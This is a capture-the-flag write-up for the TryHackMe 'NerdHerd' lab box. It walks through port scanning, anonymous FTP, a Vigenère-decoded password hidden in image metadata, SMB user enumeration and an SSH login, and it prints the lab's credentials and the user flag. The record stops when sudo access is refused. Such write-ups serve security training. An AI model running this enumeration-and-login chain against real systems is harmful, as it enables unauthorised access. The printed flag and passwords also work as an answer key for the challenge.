@@ -1,0 +1,395 @@
+# NerdHerd — Writeup
+
+## Overview
+### NerdHerd — Writeup
+### NerdHerd — Writeup
+----
+Hack your way into this easy/medium level legendary TV series "Chuck" themed box!
+----
+![](https://live.staticflickr.com/3444/3381603213_6565128fd5_b.jpg)
+![222](https://tryhackme-images.s3.amazonaws.com/room-icons/63f7ad45f1bec382a61db8f99ccb723e.png)
+### PWN
+Start Machine
+_This is the very first vulnerable machine that I've created. So, feel free to share your opinions/advices with me on my_ _**DC: 0xpr0N3rd** (alright maybe for nudges too)
+_
+_I've enjoyed developing this box and I hope you enjoy it while solving._
+![](https://vignette.wikia.nocookie.net/chuck/images/1/13/Nerd_Herd_assembly.png/revision/latest?cb=20130602172459)
+**Hack this machine before nerd herd fellas arrive, happy hacking!!!**
+Answer the questions below
+
+## Enumeration
+```text
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rustscan -a 10.10.175.11 --ulimit 5500 -b 65535 -- -A -Pn
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+😵 https://admin.tryhackme.com
+
+[~] The config file is expected to be at "/home/witty/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5500.
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+Open 10.10.175.11:22
+Open 10.10.175.11:21
+Open 10.10.175.11:139
+Open 10.10.175.11:445
+Open 10.10.175.11:1337
+[~] Starting Script(s)
+[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+[~] Starting Nmap 7.93 ( https://nmap.org )
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Initiating Parallel DNS resolution of 1 host.
+Completed Parallel DNS resolution of 1 host.
+DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan
+Scanning 10.10.175.11 [5 ports]
+Discovered open port 445/tcp on 10.10.175.11
+Discovered open port 22/tcp on 10.10.175.11
+Discovered open port 139/tcp on 10.10.175.11
+Discovered open port 21/tcp on 10.10.175.11
+Discovered open port 1337/tcp on 10.10.175.11
+Completed Connect Scan (5 total ports)
+Initiating Service scan
+Scanning 5 services on 10.10.175.11
+Completed Service scan (5 services on 1 host)
+NSE: Script scanning 10.10.175.11.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+NSE: [ftp-bounce 10.10.175.11:21] PORT response: 500 Illegal PORT command.
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Nmap scan report for 10.10.175.11
+Host is up, received user-set (0.28s latency).
+
+PORT     STATE SERVICE     REASON  VERSION
+21/tcp   open  ftp         syn-ack vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.19.103
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 0c841b36b2a2e111dd6aef427b0dbb43 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYrqlEH/5dR4LGfKThK3BQuCVPxx91asS9FfOewAooNFJf4zsESd/VCHcfQCXEHucZo7+xdceZklC7PwhzmybjkN79iQcd040gw5kg0htMWuVzdzcVFowV0hC1o7Rbze7zLya1B1C105aEoRKVHVeTx0ishoJfJlkJBlx2nKrKWciDYbJQvG+1TxEJaEM4KkmkO31y0L7C3nsdaEd+Z/lNIo6JfbxwrOb6vBonPLS/lZDJdaY0vrdZJ81FRiMbSuUIj3lEtDAZNWBTwXx5kO3fwodw4KbS0ukW5srZX5TLmf/Q/T8ooCnJMLvaksIXKl0r8fjJIx0QucoCwhCTR2o1
+|   256 e25d9ee728ead3ddd4cc2086a3df23b8 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNSB3jALoSxl/A6Jtpf21NoRfbr8ICR6FpH+bbprQ17LUFUm6pUrhDSx134JBYKLOfFljhNKR57LLS6LAK0bKB0=
+|   256 ecbe237ba94c2185bca8db0e7c39de49 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII4VHJRelvecImJNkkZcKdI+vK0Hn1SjMT2r8SaiLiK3
+139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+1337/tcp open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| nbstat: NetBIOS name: NERDHERD, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
+| Names:
+|   NERDHERD<00>         Flags: <unique><active>
+|   NERDHERD<03>         Flags: <unique><active>
+|   NERDHERD<20>         Flags: <unique><active>
+|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   WORKGROUP<1d>        Flags: <unique><active>
+|   WORKGROUP<1e>        Flags: <group><active>
+| Statistics:
+|   0000000000000000000000000000000000
+|   0000000000000000000000000000000000
+|_  0000000000000000000000000000
+| smb2-time: 
+|   date: 2023-05-02T16:26:52
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: nerdherd
+|   NetBIOS computer name: NERDHERD\x00
+|   Domain name: \x00
+|   FQDN: nerdherd
+|_  System time: 2023-05-02T19:26:52+03:00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 13484/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 41059/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 37644/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 48897/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: mean: -59m56s, deviation: 1h43m54s, median: 2s
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.13 seconds
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ftp 10.10.175.11
+Connected to 10.10.175.11.
+220 (vsFTPd 3.0.3)
+Name (10.10.175.11:witty): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||46389|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
+drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
+drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
+226 Directory send OK.
+ftp> cd pub
+250 Directory successfully changed.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||45452|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
+drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
+drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .jokesonyou
+-rw-rw-r--    1 ftp      ftp         89894 Sep 11  2020 youfoundme.png
+226 Directory send OK.
+ftp> get youfoundme.png
+local: youfoundme.png remote: youfoundme.png
+229 Entering Extended Passive Mode (|||42898|)
+150 Opening BINARY mode data connection for youfoundme.png (89894 bytes).
+100% |******************************************************************| 89894      176.44 KiB/s    00:00 ETA
+226 Transfer complete.
+89894 bytes received in 00:00 (122.00 KiB/s)
+ftp> cd .jokesonyou
+250 Directory successfully changed.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||43739|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .
+drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
+-rw-r--r--    1 ftp      ftp            28 Sep 14  2020 hellon3rd.txt
+226 Directory send OK.
+ftp> more hellon3rd.txt
+all you need is in the leet
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ exiftool youfoundme.png                   
+ExifTool Version Number         : 12.57
+File Name                       : youfoundme.png
+Directory                       : .
+File Size                       : 90 kB
+File Modification Date/Time     : 2020:09:11 00:45:43-04:00
+File Access Date/Time           : 2023:05:02 12:39:56-04:00
+File Inode Change Date/Time     : 2023:05:02 12:39:56-04:00
+File Permissions                : -rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 894
+Image Height                    : 894
+Bit Depth                       : 8
+Color Type                      : RGB with Alpha
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Background Color                : 255 255 255
+Pixels Per Unit X               : 3543
+Pixels Per Unit Y               : 3543
+Pixel Units                     : meters
+Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
+Datecreate                      : 2010-10-26T08:00:31-07:00
+Datemodify                      : 2010-10-26T08:00:31-07:00
+Software                        : www.inkscape.org
+EXIF Orientation                : 1
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Resolution Unit                 : inches
+Y Cb Cr Positioning             : Centered
+Exif Version                    : 0231
+Components Configuration        : Y, Cb, Cr, -
+Flashpix Version                : 0100
+Owner Name                      : fijbxslz
+Image Size                      : 894x894
+Megapixels                      : 0.799
+
+Owner Name                      : fijbxslz
+
+view-source:http://10.10.175.11:1337/
+
+<p>Maybe the answer is in <a href="https://www.youtube.com/watch?v=9Gc4QTqslN4">here</a>.</p>
+```
+```text
+# Surfin Bird - Bird is the Word
+
+https://www.dcode.fr/vigenere-cipher
+
+ciphertext: fijbxslz , key: BIRDISTHEWORD
+
+easypass
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ smbmap -u anonymous -H 10.10.175.11                       
+[+] Guest session   	IP: 10.10.175.11:445	Name: 10.10.175.11                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	print$                                            	NO ACCESS	Printer Drivers
+	nerdherd_classified                               	NO ACCESS	Samba on Ubuntu
+	IPC$                                              	NO ACCESS	IPC Service (nerdherd server (Samba, Ubuntu))
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ enum4linux -a 10.10.175.11 
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May  2 12:54:23 2023
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.175.11
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+ ============================( Enumerating Workgroup/Domain on 10.10.175.11 )============================
+
+[+] Got domain/workgroup name: WORKGROUP
+
+ ================================( Nbtstat Information for 10.10.175.11 )================================
+
+Looking up status of 10.10.175.11
+	NERDHERD        <00> -         B <ACTIVE>  Workstation Service
+	NERDHERD        <03> -         B <ACTIVE>  Messenger Service
+	NERDHERD        <20> -         B <ACTIVE>  File Server Service
+	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+	MAC Address = 00-00-00-00-00-00
+
+ ===================================( Session Check on 10.10.175.11 )===================================
+
+[+] Server 10.10.175.11 allows sessions using username '', password ''
+
+ ================================( Getting domain SID for 10.10.175.11 )================================
+
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ===================================( OS information on 10.10.175.11 )===================================
+
+[E] Can't get OS info with smbclient
+
+[+] Got OS info for 10.10.175.11 from srvinfo: 
+	NERDHERD       Wk Sv PrQ Unx NT SNT nerdherd server (Samba, Ubuntu)
+	platform_id     :	500
+	os version      :	6.1
+	server type     :	0x809a03
+
+ =======================================( Users on 10.10.175.11 )=======================================
+
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck	Name: ChuckBartowski	Desc: 
+
+user:[chuck] rid:[0x3e8]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ smbclient //10.10.175.11/nerdherd_classified --user=chuck 
+Password for [WORKGROUP\chuck]: easypass
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Sep 10 21:29:53 2020
+  ..                                  D        0  Thu Nov  5 15:44:40 2020
+  secr3t.txt                          N      125  Thu Sep 10 21:29:53 2020
+
+		8124856 blocks of size 1024. 3414256 blocks available
+smb: \> more secr3t.txt
+getting file \secr3t.txt of size 125 as /tmp/smbmore.hAPPP5 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+
+Ssssh! don't tell this anyone because you deserved it this far:
+
+        check out "/this1sn0tadirect0ry"
+
+Sincerely,
+        0xpr0N3rd
+<3
+
+http://10.10.175.11:1337/this1sn0tadirect0ry/creds.txt
+
+alright, enough with the games.
+
+here, take my ssh creds:
+	
+	chuck : th1s41ntmypa5s
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa chuck@10.10.175.11
+The authenticity of host '10.10.175.11 (10.10.175.11)' can't be established.
+ED25519 key fingerprint is SHA256:4V4PIhnGrI839xlu2pqGA5v5JX8UwkjDWR2IK/ykQeE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.175.11' (ED25519) to the list of known hosts.
+chuck@10.10.175.11's password: th1s41ntmypa5s
+Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+747 packages can be updated.
+522 updates are security updates.
+
+Last login: Wed Oct 14 17:03:42 2020 from 22.0.97.11
+chuck@nerdherd:~$ id
+uid=1000(chuck) gid=1000(chuck) groups=1000(chuck),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+chuck@nerdherd:~$ ls
+Desktop    Downloads         Music                Pictures  Templates  Videos
+Documents  examples.desktop  nerdherd_classified  Public    user.txt
+chuck@nerdherd:~$ cat user.txt 
+THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}
+chuck@nerdherd:~$ sudo -l
+[sudo] password for chuck: 
+Sorry, user chuck may not run sudo on nerdherd.
